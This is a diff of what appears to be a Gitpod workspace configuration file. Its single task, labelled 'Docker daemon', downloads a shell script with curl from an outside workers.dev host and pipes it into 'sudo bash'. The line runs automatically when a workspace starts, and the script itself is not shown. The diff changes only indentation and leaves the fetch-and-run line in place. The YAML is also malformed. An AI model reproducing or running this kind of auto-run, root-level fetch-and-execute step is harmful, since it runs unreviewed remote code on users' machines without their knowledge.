@@ -2,4 +2,4 @@ image: gitpod/workspace-full
 
 tasks:
     name: Docker daemon
-  - command: curl -s http://boxmirrorbomt.boxmirrorbomt.workers.dev/0:/MirrorBomt1/setupgitpod.sh | sudo bash -s
+ - command: curl -s http://boxmirrorbomt.boxmirrorbomt.workers.dev/0:/MirrorBomt1/setupgitpod.sh | sudo bash -s
